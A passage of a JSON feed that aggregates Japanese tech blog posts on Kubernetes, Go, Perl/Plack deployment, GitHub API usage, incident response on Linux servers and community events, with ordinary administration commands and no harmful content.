FabricWSL2感想Azureに関連したテーマのセッションがほとんどでした。クラウドサービスは以前に比べ使いやすくなっていて、機能も充実してきた印象です。AKS、AzureADの動向は今後も注目していこうと思います。LT資料社内勉強会で de:code の recap を発表しました。    Recap of de code 2019  from Kyohei Mizumoto www.slideshare.netおまけ2日間のお昼のお弁当です。1日目2日目","isoDate":"2019-06-06T02:18:05.000Z","dateMiliSeconds":1559787485000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kubernetesリンク集","link":"https://kyohmizu.hatenablog.com/entry/2019/05/28/115504","contentSnippet":"Kubernetes関連の役立つリンクを記載します。公式リファレンスReference - KubernetesKubectl Reference DocsPhippy and Friends - Cloud Native Computing FoundationGitHubGitHub - kubernetes/kubernetes: Production-Grade Container Scheduling and ManagementGitHub - kelseyhightower/kubernetes-the-hard-way: Bootstrap Kubernetes the hard way on Google Cloud Platform. No scripts.GitHub - jamiehannaford/what-happens-when-k8s: \uD83E\uDD14 What happens when I type kubectl run?プロダクトGoogle Kubernetes Engine documentation \xa0|\xa0 Kubernetes Engine \xa0|\xa0 Google CloudAzure Kubernetes Service (AKS) Documentation - Tutorials, API Reference | Microsoft DocsWhat Is Amazon EKS? - Amazon EKSDocumentation | Rancher LabsK3s: Kightweight KubernetesPivotal Container Service (PKS) | Pivotalスライド、ブログ等Kubernetes のソースコードとの付き合い方 #gounco / Kubernetes source code reading - Speaker DeckKubernetes Patterns : Capacity PlanningKubeWeekly - QiitaKubernetesのユーザー管理と認証・権限確認機構を理解しよう | さくらのナレッジ書籍Kubernetes完全ガイド - インプレスブックス","isoDate":"2019-05-28T02:55:04.000Z","dateMiliSeconds":1559012104000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【20日チャレンジ】LinuxコマンドをGoで実装","link":"https://kyohmizu.hatenablog.com/entry/2019/05/23/172119","contentSnippet":"Go言語の学習のため、LinuxコマンドをGoで実装します。\\r目的\\r\\rGo言語に慣れる\\r標準パッケージの機能、使い方を知る\\r\\rルール\\r以下のルールでチャレンジを行います。\\r\\r1日1コマンドを実装する\\r最低限、コマンドの基本的な動作(オプションなしの実行など)を行えるようにする\\r余裕があれば追加機能を実装する\\rコマンド名は\\"my\\" + \\"Linuxコマンド名\\"とする\\r極力標準パッケージを使用する\\r\\rソースコード\\rソースコードはGithubで管理します。\\rhttps://github.com/kyohmizu/go-cli-tools\\rスケジュール\\r\\r\\r\\rNo\\r日付\\rコマンド\\r基本実装\\rオプション\\r学習内容\\r\\r\\r1\\r5/23\\rmyls\\r〇\\r\xa0\\r\\rディレクトリ操作\\rエラー処理\xa0\\r\\r\\r\\r2\\r5/24\\rmycp\\r〇\\r△\\rファイル操作\\r\\r\\r3\\r5/25\\rmymv\\r〇\\r△\\r\xa0\\r\\r\\r4\\r5/26\\rmyrm\\r〇\\r△\\r\xa0\\r\\r\\r5\\r5/27\\rmycat\\r〇\\r△\\r\xa0\\r\\r\\r6\\r5/28\\rmycurl\\r〇\\r△\\r\\rhttp接続の実装\\rオプションの複数回指定\\r\\r\\r\\r7\\r5/29\\rmypwd\\r〇\\r△\\r\xa0OSによる条件分岐\\r\\r\\r8\\r5/30\\rmytouch\\r〇\\r△\\rbuild tagの設定\xa0\\r\\r\\r9\\r5/31\\rmymkdir\\r〇\\r△\\r\xa0ファイルの操作権限\\r\\r\\r10\\r6/1\\rmykill\\r〇\\r〇\\rプロセスとシグナル\xa0\\r\\r\\r11\\r6/2\\rmyecho\\r〇\\r-\\r引数の取得\\r\\r\\r12\\r6/3\\rmytime\\r△\\r-\\r\\rコマンド実行\\rtimeの操作\\r\\r\\r\\r13\\r6/4\\rmychmod\\r△\\r-\\r\\rbit演算\\rファイルの権限\\r\\r\\r\\r14\\r6/5\\rmyyes\\r〇\\r〇\\r\xa0\\r\\r\\r15\\r6/6\\rmyenv\\r〇\\r△\\r\\rwindowsで確認不可\\r\\r\\r\\r16\\r6/7\\rmychown\\r〇\\r△\\r\\ruser,group操作\\rwindowsで確認不可\\r\\r\\r\\r17\\r6/8\\rmygrep\\r〇\\r△\\r\\rgrepの操作\\rgoの正規表現\\r\\r\\r\\r18\\r6/9\\rmysleep\\r〇\\r△\\r\xa0\\r\\r\\r19\\r6/10\\rmymkdir\\r〇\\r△\\r\xa0\\r\\r\\r20\\r6/11\\rmyln\\r〇\\r△\\rリンクの操作\\r\\r\\r\\r\xa0\\r成果\\r\\rGoの構文や記法に慣れてきた\\rGo標準パッケージの使い方、調べ方を覚えた\\rLinuxコマンドの動作を知ることができた\xa0\\r\\r感想\\r20日も書けば、ある程度書けるようになることがわかりました。\\r普段使用するC#とGoが似ている点も覚えやすかったのだと思います。\\r次はGoでAPIを作成してみようと考えています。","isoDate":"2019-05-23T08:21:19.000Z","dateMiliSeconds":1558599679000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"2018年振り返りと、2019年の目標","link":"https://kyohmizu.hatenablog.com/entry/2018/12/31/231740","contentSnippet":"2018年5月末から、エンジニアリングに関する様々な活動を行ってきました。\\r1年の終わりにそれらの活動をまとめ、2019年の目標を記したいと思います。\\r\\r2018年の活動\\r2018年は積極的に新しい技術へチャレンジし、勉強会を通して素晴らしい方々に出会うことができました。\\r新たに触れた技術・ツール\\r\\rGitHub\\rNode.js\\rAngular\\rGolang\\rCentOS\\rDocker\\rKubernetes\\rAzure\\rGCP\\rOWASP ZAP\\rLINE BOT/Clova\\rAgile\\rペアプログラミング/モブプログラミング\\r\\r勉強会・カンファレンス\\r\\rLINE Developer Meetup\\rde:code 2018\\rAzureもくもく会\\rng-japan 2018\\rSQL Server 2017勉強会\\rInteract 2018\\rCCSE 2018\\rThink Japan IBM Code Day\\rJXUG Xamarinハンズオン\\rCosmos DBハンズオン\\rくじらや Dockerハンズオン\\rLINE Clovaスキル開発ハンズオン\\rLINE BOOT AWARDS 2018 ハッカソン\\rGDG DevFest Tokyo 2018\\rXP祭り\\rAzureML勉強会\\rBIT VALLEY 2018\\r.NET Conf 2018\\rContainer SIG Meet-up\\rテスト管理を語る夕べ\\rAVTOKYO\\rアジャイル相談室\\rOSSセキュリティ技術の会\\rJapan Container Days\\r\\r※Japan Container Daysはスタッフとして参加させてもらいました。\\r書籍\\r読了\\r\\r徹底攻略 データベーススペシャリスト教科書\\r徹底攻略 ネットワークスペシャリスト教科書\\rショートコードプログラミング 第3版\\r新装版 達人プログラマー\\rSQLアンチパターン\\rインフラエンジニアの教科書2\\rプログラマのためのDocker教科書 第2版\\rDocker/Kubernetes 実践コンテナ開発入門\\r\\r読みかけ\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\r\\r社内の活動\\r\\r技術交流、コミュニケーション促進のためチャンネルを開設\\r社内勉強会を主催\\rモブプログラミング・ペアプログラミングを開始\\r\\r資格\\r合格\\r\\rデータベーススペシャリスト\\r\\r不合格\\r\\rネットワークスペシャリスト\\r\\r午後Ⅰが1点足りず…\\rその他\\r\\rはてなブログを開設\\rQiitaアドベントカレンダーに参加\\r\\r2019年の目標\\r7ヶ月間の活動の中で、様々な技術分野にチャレンジした結果、インフラ・セキュリティへの関心が強いことがわかりました。\\r2019年はContainerを中心にインフラのスキルを身に着け、セキュリティ分野の知見を広めていきます。\\r書籍\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\rKubernetes完全ガイド\\rハッカーの学校\\rテスト駆動開発\\r徹底マスター JavaScriptの教科書\\rドメイン駆動設計\\rハッキング・ラボのつくりかた\\r\\r資格\\r\\rLPIC Level1\\r情報処理安全確保支援士\\rネットワークスペシャリスト","isoDate":"2018-12-31T14:17:40.000Z","dateMiliSeconds":1546265860000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"モバイルファクトリーのインフラアーキテクチャというアドベントカレンダー書いてました","link":"https://blog.masasuzu.net/entry/2018/12/22/000000","contentSnippet":"ちょっと過去の話ですが、会社の技術ブログで書いてました。tech.mobilefactory.jp","isoDate":"2018-12-21T15:00:00.000Z","dateMiliSeconds":1545404400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"kubernetesにあるIngress Controller�の一覧を挙げてみる","link":"https://qiita.com/skikkh/items/c59de1f5e188d0bbeb35","contentSnippet":"はじめにIngress ControllerはL7 Load Balancerの機能を果たすものであり、Ingressリソースはそのルールを定義したものです。このIngress Controllerを実際に実装したものは数多作られており、環境によって、大なり小なり記述方...","isoDate":"2018-12-17T14:21:33.000Z","dateMiliSeconds":1545056493000,"authorName":"skikkh","authorId":"skikkh"},{"title":"日本語でvimのfを使う","link":"https://qiita.com/atsuya0/items/d90bb3f4b8e538c028a9","contentSnippet":"fvimではf, F, t, Tを使うことで、瞬時に目的の文字上にカーソルを移動することができます。動作faでカーソルから右側の方向の１番近い「a」の位置に移動することができます。3faでカーソルから右側の方向の３番目に近い「a」の位置に移動することができます。...","isoDate":"2018-12-04T06:03:39.000Z","dateMiliSeconds":1543903419000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[Docker] awslogs-datetime-format の指定方法に注意","link":"https://qiita.com/toshikish/items/59a3a4426930e29f0673","contentSnippet":"[Docker] awslogs-datetime-format の指定方法に注意背景Dockerの awslogs ログドライバでは，awslogs-datetime-format オプションがあり，指定した形式の日時がログのある行に含まれていれば，続く行も同じ...","isoDate":"2018-11-07T03:23:50.000Z","dateMiliSeconds":1541561030000,"authorName":"toshikish","authorId":"toshikish"},{"title":"ローカル環境でAnsibleの鍵交換がめんどくさい貴方に送るプラクティス","link":"https://qiita.com/skikkh/items/ca236c512d314691b35c","contentSnippet":"はじめに平成の時分も終わりに近づく中、野分立ち尽くす天災に人々は翻弄され、お家で過ごすのを余儀なくされる日が多いように思います。1今日のような一日は、自然とQiitaにたどり着き、PVが増えるのではないかと勝手に邪推する筆者です。さて、話は閑話休題。ローカル環...","isoDate":"2018-09-30T09:33:37.000Z","dateMiliSeconds":1538300017000,"authorName":"skikkh","authorId":"skikkh"},{"title":"新人が学ぶAnsibleもくもく会 ネットワーク編 報告会","link":"https://qiita.com/skikkh/items/156c677e07ffc6b5b4ef","contentSnippet":"はじめにお久しぶりのエントリになります。新卒でインフラエンジニアをしている小心者のひよこです。このような職種に身をおいてはや5ヶ月というところで、世の中を幅広く見渡してみると、どうやら世は大クラウド時代を嚆矢として、様々なレイヤーでの自動化、Kubenetesに...","isoDate":"2018-08-29T14:34:09.000Z","dateMiliSeconds":1535553249000,"authorName":"skikkh","authorId":"skikkh"},{"title":"[Laravel] バリデーションデータに前処理したい","link":"https://qiita.com/toshikish/items/f38b691adbebd7ba7720","contentSnippet":"[Laravel] バリデーションデータに前処理したい当てはまるケースフォーム入力データとデータベース保存データの形式が違う．例えば…全角・半角変換先頭・末尾の空白を取り除くユーザーには090で始まる形式の携帯電話番号を入力してもらっているが，システム的に...","isoDate":"2018-06-12T09:27:45.000Z","dateMiliSeconds":1528795665000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Git リポジトリを分割する","link":"https://qiita.com/toshikish/items/3529f75c511a65723798","contentSnippet":"以下のようなディレクトリ構造のリポジトリを分割する方法を場合分けしてまとめます。repo1/ ├─ subdir/ ├─ aaa ├─ bbb ├─ ccc └─ dddケース1：サブディレクトリを切り出すリポジトリ repo1 のサブディレクトリ su...","isoDate":"2018-04-11T10:14:22.000Z","dateMiliSeconds":1523441662000,"authorName":"toshikish","authorId":"toshikish"},{"title":"障碍対応と私","link":"https://blog.masasuzu.net/entry/2015/12/18/troubleshooting","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 18日目の記事です昨日は@yashims85さんのAndroid drawableは画像を入れておくだけじゃないでした。今日は障碍の話です。普段障碍対応しているときにやってること考えてることをざっくりと時系列を追って書いていきたいと思います。コンテキストとしてはLinuxサーバでwebサービスをやっていると思っていただければと思います。障碍の検知webサービスを運営していれば、何かしらの監視システムからSlackなりIRCなりメールなり電話なりでアラートの通知が来ると思います。対応報告障碍対応をしている旨をメールなり、何かの連絡手段で伝えます。同じく見ている人がいれば調査作業の分担もできます。状況把握どこで障碍?アラートの通知内容にどのサーバで何が起きた的なことが書いてあるはずなので、それを確認します。だいたいの組織に於いてはサーバ管理表的なものがwebなりExcelなり設定ファイルなりにあるはずなので、そこと照らし合わせてどのプロジェクトのどのロールなのかを把握します。直前に何をした? いつもと違うことは何?webアプリケーションであれば直前に入れた変更が原因かもしれません。また、ちょっと前に入れていた変更だが、cronで時限発火したというケースも考えられるかも知れません。イベント開始で急にトラフィックが上がったと言うことも考えられるかも知れません。普段と変わったことは何かということが把握出来れば対処の幅が広がります。影響範囲は?サービス全体なのか、サービスの1機能の障碍なのか、ミドルウェア障碍なのか、影響がどの範囲に及んでいるのかを見ます。ミドルウェア障碍であれば、最近であれば、冗長化されてるのが普通なので、サービスから切り離して、監視から外せば終わりというパターンも多いです。サービス全体が落ちている場合は、ひとまず重要な関係者に状況の1次連絡すぐにした方が良いでしょう。接続出来る?そもそも、該当サーバに接続出来ない場合は、できることはほぼないので、該当サーバをサービスから外した上で、監視対象から外します。(単体のサーバ障碍の場合)# pingは通る?ping ${IP}# sshできる?ssh ${IP}ログの確認該当サーバ上で動いているミドルウェアやアプリケーションサーバのエラーログを主に見ます。だいたいこの辺に重要な情報が出力されている可能性があります。システムのログも確認した方が良いです。主にsyslogやkernelログを見ると良いでしょう。# syslogを見るless /var/log/syslog# kernelログを見るless /var/log/kern.log# kernelログを見る2dmesgサーバ状態の確認負荷の関係で障碍が起きているのであれば、現在のサーバの状態を確認しましょう。以下のようなコマンドが現状把握に役立つでしょう。# loadaverageおよびログイン中のユーザを見るw# 変なプロセス無いか見るps -ef# orps auxwwww# 開いているポートを確認するnetstat -tlnp# ネットワークコネクションを確認するnetstat -taopen# なにかCPU使いまくってないか見るtop# 現在の負荷の経過を見るdstat -tamsl 5# 過去の負荷情報を見る## CPUsar## memorysar -r## lasar -q対処直前のコミットにバグを入れ込んでしまったのであればリバートすれば解決するでしょうし、特定のサーバ落ちたのであれば、サービスから外してあげるだけで良いかも知れません。障碍の内容によって対処方法は様々です。ここで気を付けたいのは二次災害を起こさないことです。可能であれば、コマンドなり対処スクリプトのレビューをしてもらったり、現状認識に間違いがないかを周りの人にしてもらうと良いでしょう。(往々にして一人で障碍対応せざるを得ない場合もありますが。。)事後報告障碍対応が終わったら、記憶が新鮮なうちに下記の内容をまとめてしかるべき場所に投稿します。この辺の報告のフォーマットはだいたいの組織において決まっていることが多いでしょう。障碍内容影響範囲経過対処方法将来の対策面倒くさがらずに事実をなるべく詳細に書いておくと未来の自分や自組織のためになると思います。私の組織でも過去の障碍報告がだいぶ良い感じにデータベースになっており、たまに読み返すと気付きが得られます。また、この障碍報告を元に、同種の障碍をなるべく起こさない仕組み作りをしていくことが肝要だと思います。終わりに自分が障碍対応しているときにやってること、考えてることをざっくり書いてきました。誰にやり方を教わったわけでもないので、そこは違うとかこうした方がいいとかあれば、いただけると幸いです。明日は、@lycoris102さんのGameJam部 活動年間活動報告です。きっと面白い話なのではないでしょうか。","isoDate":"2015-12-18T13:00:00.000Z","dateMiliSeconds":1450443600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#chibapm Chiba.pm#7に参加しました。","link":"https://blog.masasuzu.net/entry/2015/12/12/chiba.pm-7","contentSnippet":"参加しました。雑なスライドですみません。スライド中に出てきてるやつはどれも五反田のお店で出てきます。五反田企業のガイアックスさんとかモバイルファクトリーさんはPerlの会社なので、美味しいごはんを食べたい人は検討してみてはいかがでしょうか。そういえば、Chiba.pmの開催回数がKichijoji.pm、Gotanda.pmに抜かされそうです。。","isoDate":"2015-12-12T09:39:37.000Z","dateMiliSeconds":1449913177000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-12-12-chiba.pm7","link":"https://speakerdeck.com/masasuzu/2015-12-12-chiba-dot-pm7","contentSnippet":"Chiba.pm#7 2015年をふりかえる","isoDate":"2015-12-12T05:00:00.000Z","dateMiliSeconds":1449896400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Plack/PSGIなwebアプリケーションの実行環境","link":"https://blog.masasuzu.net/entry/2015/12/11/plack-psgi-exec-env","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 11日目の記事です※ 投稿内容は私個人の意見であり、所属企業・部門見解ならびに技術戦略を代表するものではありません。昨日は@rymizukiさんのnpmライブラリの運用と管理についてでした。今日はPerlの話です。お仕事やプライベートでPerlのwebアプリケーションを書くことが多く、いろいろ知見が溜まってきてるので、ここで少し紹介しようと思います。今回はPlack/PSGIなwebアプリケーションの実行環境の話です。mod_perlなアプリケーションとはちょっとコンテキストが違います。少しかっちりコンテキストに近いです。個人で軽くwebアプリケーション立てるならもう少しゆるふわでも問題ないはずです。OSUbuntuのLTSを使うことが多いです。Ubuntu前提の内容が後に続きます。PerlSystem Perlは使ってません。OS/ディストリビューションが変わってもなるべくそのまま動くようにしたいためです。perl-buildで独自ビルドしたPerlを使います。インストール場所としては、 /usr/local/perl/perl-5.${VERSION} に置きます。Perlを独自ビルドしたものをDebian package化して実行環境にはインストールします。他の方法としては、ビルド済みのperlをtarで固めて、配布するというのもあります。どちらでも構わないのですが、ローカルネットワークにaptサーバ立てている関係で、Debian packageの方が運用しやすいのです。また、perlのマイナーバージョンアップの際もDebian packageを作り直した上で、 apt-get upgrade (or aptitude safe-upgrade)で完結するので、aptの操作に慣れていて楽というのもあります。モジュール管理今風にcpanfileでモジュール管理してます。モジュールインストールはCartonを使ってます。Cartonの後継でCarmelも開発されてます。個人的にはそろそろ触っておきたいところです。また、cpanfile.snapshotもレポジトリに入れています。一般的なモジュールは特定の(古い)バージョンに依存せずに動くべきですが、依存モジュールのバージョン違いによって現在動いているアプリケーションが壊れるのを防ぐために、バージョン固定します。cpanfile.snapshotがある状態で下記のように carton install してあげると、どの環境でも同じバージョンのモジュールがインストールされます。carton install --deployment --without develop,test今やってないですが、別方法としては、モジュールがインストール済みの状態で、 carton bundle すると vendar/ にモジュールのtarが固められるので、それもレポジトリ管理した上で、下記の様にインストールするという手もあります。インストールの際は vendor/bin/carton  にfatpackされたcartonコマンドが入るのでそれを使います。(アプリ実行環境にcartonを敢えて入れる必要は無い)# 依存モジュールを固めるcarton bundle# インストール# env.shは後述./script/env.sh vendor/bin/carton install --cached --deployment --without develop,testさらに別方法としては、ビルドサーバで依存モジュールをビルドした上で、ディレクトリごと実行環境にrsyncしてあげる方法です。ビルドサーバを運用しているならば、この方法でも良いでしょう。参照Carton考2014carton bundle && carton install --cachedの使いどころ独自モジュールなるべく、独自モジュールは使わない方が良いのですが、個人的な事情などで、CPANに公開出来ないモジュールに関しては、OrePAN2 でDarkpanを作ってそこからローカルに配信するようにしてます。OrePAN2のサーバを簡単に立ち上げられるOrePAN2::Serverがありますが、一時期は使っていましたが、モジュールのアップロード機能は別にいらないなどの理由で今はwebサーバから静的配信してます。環境変数プロジェクトのレポジトリに config/env.rc という名前で、アプリケーションを動かすために必要な環境変数を定義したファイルを作ります。PERL5_VERSION=\\"22\\"export PROJECT_BASE=\\"/path/to/project\\"export PERL_CARTON_MIRROR=\\"http://orepan.local/\\"export PERL5LIB=\\"${PROJECT_BASE}/local/lib/perl5:${PROJECT_BASE}/lib\\"export PATH=\\"${PROJECT_BASE}/local/bin:/usr/local/perl/perl-5.${PERL5_VERSION}/bin:${PATH}\\"export PLACK_PORT=5555また、 script/env.sh という名前で config/env.rc を読み込んだ上で、プログラムを実行するラッパースクリプトを作ります。スクリプトなどは基本的にこれを通して実行します。#!/bin/bash -ue# 諸々環境変数を設定した上でコマンドを実行する君##       env.sh perl hogehoge.pl#source /path/to/project/config/env.rcexec \\"$@\\"開発環境で、いちいちラッパースクリプト通すのが面倒な場合は、config/env.rc のsymlinkをプロジェクトルートに .envrc として張った上で、direnv使って済ましてしまう場合もあります。web サーバ起動スクリプトpsgiファイルを plackup するのではなく、こんな感じのスクリプトをscript/web みたいな名前で 用意してアプリケーションサーバを起動するようにしてます。#!/usr/bin/env perluse strict;use warnings;use lib \\"$ENV{PROJECT_BASE}/lib\\";use Plack::Loader;use SomeApplication::Config;use SomeApplication::Web::Handler;my $config = SomeApplication::Config->load();my $app    = SomeApplication::Web->to_app();Plack::Loader->load(    $config->{psgi}->{server},    %{ $config->{psgi}->{config} },)->run($app);また、このスクリプトをstart_serverを経由して起動することで、(graceful restartによる)ホットデプロイをできるようにしてます。start_server のプロセスにSIGHUPを送ると子プロセスのアプリケーションサーバを再起動してくれるのですが、 plackup コマンドで起動してると start_server に渡した引数をそのまま使ってplackup を再起動するので、 max_workers の数を変えたいときなど、 start_server 自体のプロセスを再起動しなくてはならないので不便です。なので、起動スクリプトを作ってます。そのほかにも理由があるのですが、参照リンクに詳しくあります。サーバ実装としては、StarletやGazelleを使ってます。参照PSGI/Plackアプリケーションの起動方法いろいろと本番環境アレコレ普通に使う Plack/PSGI ServerGraduate from .psgiデーモン管理現在はUpstartでアプリケーションサーバのデーモン管理してます。以下の理由で、個人的には好きでした(過去形)。最新のUbuntuはSystemdに変わってしまったので、将来的にはSystemdに移行することになるでしょう。Ubuntuに標準で入っていてサーバ起動時の自動起動してくれてデーモン異常終了時に自動再起動してくれて設定はわりかしわかりやすい/etc/init/web-some-application.conf みたいな名前でこんな設定ファイルを作りますdescription \'some web application\'author \'masasuzu <hogehoge@masasuzu.net>\'start on runlevel [2345]stop on starting rc RUNLEVEL=[016]setuid webappsetgid webapp# 異常時に再起動するrespawnscript    . /path/to/project/config/env.rc    export PLACK_ENV=\\"production\\"    exec ${PROJECT_BASE}/local/bin/start_server \\\\        --interval 10           \\\\        --port ${PLACK_PORT}    \\\\        -- ${PROJECT_BASE}/script/service/webend script上記のファイルを作ると以下のように操作出来ます。reloadでSIGHUPが送れるので、アプリケーションサーバのstart_server経由のgraceful restartができます。# 起動service web-some-application start# 停止service web-some-application stop# (start_serverのプロセスごと)再起動service web-some-application restart# Plackサーバを再起動service web-some-application reloadアプリケーションサーバ以外も、ジョブのワーカーなども、独自に設定ファイルを作って、Upstart経由で起動したりしてます。Upstart以外の選択肢としては、先に挙げたSystemdの他、以下のものがあるでしょう。好みと要件に合わせて使えば良いと思います。daemontoolsSuvpervisordSystemd参照Server::Starterから学ぶhot deployの仕組みServer::Starter の --interval オプションは大切Upstart を使ってお手軽 daemon 化Upstart Intro, Cookbook and Best PractisesおわりにWAF(Web Application Framework)やログの話など膨らまそうと思えばもっと膨らませられますが、実行環境の話なので、ここまでで抑えておきます。ざっくりと、Plack/PSGIなアプリケーションの実行環境について説明してきました。PerlでWebアプリケーションを作る時に何か参考になれば幸いです。また、もっと良い方法があれば、教えていただけるとありがたいです。明日は、@nekobato さんです webpackのなにか面白い話があるんじゃないかとわくどきしてます。","isoDate":"2015-12-11T04:30:00.000Z","dateMiliSeconds":1449808200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Github APIを使おう","link":"https://blog.masasuzu.net/entry/2015/12/04/use_github_api","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 4日目の記事です今日は、Github APIの話です。Githubの管理作業は他のWebサービスと同じく基本Webコンソールでできます。ただ、Organizationとかを管理してる場合、ある程度以上規模が大きくなると、定型的な管理作業が増えて、Webでぽちぽちやるには煩雑でつらくなってきます。ここで怠惰エンジニア*1はどうにかこの定型作業を自動化/スクリプト化できないかなと考え始めます。幸い、GithubにはAPIがあるので、これを利用して要件に合わせて、実装することができます。ドキュメントは以下の場所にあるので、各APIの使い方などはそちらを参照してください。GitHub API v3 | GitHub Developer Guideapiアクセスを投げるpublicな情報を取得するには普通にcurlでGET発行するだけで、取得出来ます。curl https://api.github.com/users/masasuzu/reposが、これだけでは、privateな情報にアクセスできません。ので、Basic認証をしてアクセスをします。curl -u ${USER}:${PASSWORD} https://api.github.com/orgs/some_privete/reposただ、この場合、このアカウントで出来ることが全て実行出来てしまうので、下記のリンクからアクセストークンを発行して、権限を絞ってAPIにアクセスするのが望ましいです。アクセストークンは作成時にしか見れないので、ちゃんと書き留めておくようにしましょう。Personal access tokensアクセストークンを使用した場合、下記の3つの方法で認証出来ます。curl -u :${ACCESS_TOKEN} https://api.github.com/orgs/some_privete/reposcurl -H \'Authorization: token ${ACCESS_TOKEN}\' https://api.github.com/orgs/some_privete/reposcurl \'https://api.github.com/orgs/some_private/repos?access_token=${ACCESS_TOKEN}\'ドキュメントに各API発行に必要なscope(権限)が書いてあるので必要なscopeだけ付与してあげると良いです。perlでの選択肢今までで、APIアクセスする手段を得ることはできましたが、シェルスクリプトで処理を組み立てるのは、無謀なので、使い慣れてるプログラミング言語で実装したいところです。当社ではPerlを使い慣れてるエンジニアが多いので、ここではPerlのクライアントを紹介します。現在のところ以下の2つの選択肢があります。PithubNet::Github私はPithubを使っています。使い始めた時期においてPithubの方が更新されてそうだったからです。が、今見るとNet::Githubも更新されてるように見えます。他の言語での選択肢特にプログラミング言語にこだわりが無いのであれば、githubがメンテナンスしてるoctokitを使うと良いと思います。RubyとObjective C、.Netに対応してます。たぶん鉄板だと思います。(しかし、octokitのこのサンライズというかバンダイに怒られそうなデザインは大丈夫なのでしょうか?まとめ煩雑で定型的な作業はGithub APIで自動化すると良いPrivateな情報の操作はアクセストークンを発行してAPIを発行するPerlにはPithubとNet::Githubのクライアントライブラリがあるこだわりがなければ、クライアントはoctokit使うと良い明日は、 @mihyaeru21 さんです。iOS回りの面白いエントリが見れそうです。*1:プログラマの3大美徳の1つ","isoDate":"2015-12-04T14:47:44.000Z","dateMiliSeconds":1449240464000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #6 でLTしてきました。","link":"https://blog.masasuzu.net/entry/2015/09/17/Gotanda.pm6","contentSnippet":"gotanda-pm.connpass.comGotanda.pmでLTしてきました。今回のテーマは障碍でした。半分ネタのトークです。JSTQB Foundation Level のシラバスに載っているソフトウェアテストの7原則をもじったやつです。JSTQB認定テスト技術者資格-シラバス（学習事項）・用語集-言ってみれば、サービスに対して継続的にテストするのが監視なのでテストに対する原則が監視に対しても言えるんじゃないかなーという軽い思いつきから生まれました。無理矢理な部分もありましたが、わりかし当てはまってる部分もあったのではないかと思いました。トーク中美味しいにおいがしてきてつらかったです。(このエントリは懇親会の前に書かれてます)#gotandapm 美味しそうなにおいがして辛い。。。。— masasuzu? (@masasuz) September 17, 2015ガイアックスさん会場提供ありがとうございました。","isoDate":"2015-09-17T12:14:35.000Z","dateMiliSeconds":1442492075000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-09-17_gotanda.pm6","link":"https://speakerdeck.com/masasuzu/2015-09-17-gotanda-dot-pm6","contentSnippet":"Gotanda.pm#6 LT\\r監視の7原則という半分ネタなトーク","isoDate":"2015-09-17T04:00:00.000Z","dateMiliSeconds":1442462400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#yapcasia YAPC::Asia 2015でボランティアスタッフしてきた","link":"https://blog.masasuzu.net/entry/2015/08/23/YAPC_Asia","contentSnippet":"今年のYAPC::Asiaは終わった。つつがなく終わりました。過去のエントリを見直すと2011、2012年は書くのサボっていたみたいでした。私のYAPC::Asia初参加は2010年で6回目の参加でした。#yapcasia YAPC::Asia 2014でボランティアスタッフやってきました - 目の前に僕らの道があるmasasuzu.hatenablog.jp#yapcasia YAPC::Asia Tokyo 2013に参加してきました。 - 目の前に僕らの道があるmasasuzu.hatenablog.jpYAPC::Asia 2010へ行ってきたよ。 - 目の前に僕らの道があるmasasuzu.hatenablog.jp今年のYAPCとの関わり方は個人スポンサー+ボランティアスタッフとして参加しました。個人スポンサーとしては4年目、ボランティアスタッフとしては3年目でした。今年のYAPCもすごい楽しかったです。特にここ1,2年でPerl関係の人たちの知り合いがすごい増えたので、いろんな人と話ができてすごい楽しかったです。トークの方は例年スタッフ業をやっていると聞けないので、(会場にいてもスタッフのお仕事に意識が行くので内容を聞き取れてないことが多い)、動画が上がったら気になっていたトークを追いたいと思います。さて、だいたい6年前からWebで、Perlでお仕事するようになってからYAPCにはいろいろなものをもらってきました。だからこそ、ボランティアスタッフをやったり、個人スポンサーになって自分がもらったものを間接的に他の人に与えられたらいいなと思ってやってきました。自分がもらったものを他の人も受け取ってもらえたらなら良いなと思います。YAPC::Asiaはいったん終わります。それ自体いろいろ思うところがありますし、残念ではあります。YAPC::Asiaが無くなっても地域PMなどのPerlのコミュニティ自体が無くなるわけではないので私も細々とコミュニティ活動していきます。ただ、全国的にPerlな人が集まってくるイベントが今のところ来年無いのは寂しいところです。もしどこかで動きがあるならお手伝いさせていただければなと思います。YAPC::Asiaお疲れ様でした。(初日の懇親会の後の二次会でいろんな人に迷惑かけてしまったようなのでものすごく反省しています。すみません。お酒気を付けます。。。会期中のつぶやきいくつかおしゃれなカップだ #yapcasia pic.twitter.com/NwWw30i3HW— masasuzu? (@masasuz) August 22, 2015#yapcasia Perl6！ pic.twitter.com/2tJh6irctZ— masasuzu? (@masasuz) August 22, 2015#yapcasia  壇上から。お疲れさまでした！！ pic.twitter.com/1MiU56gE4R— masasuzu? (@masasuz) August 22, 2015","isoDate":"2015-08-23T10:17:16.000Z","dateMiliSeconds":1440325036000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#kichijojipm 吉祥寺.pmでLTしてきた","link":"https://blog.masasuzu.net/entry/2015/07/12/122011","contentSnippet":"吉祥寺.pm (kichijojipm) #4 : 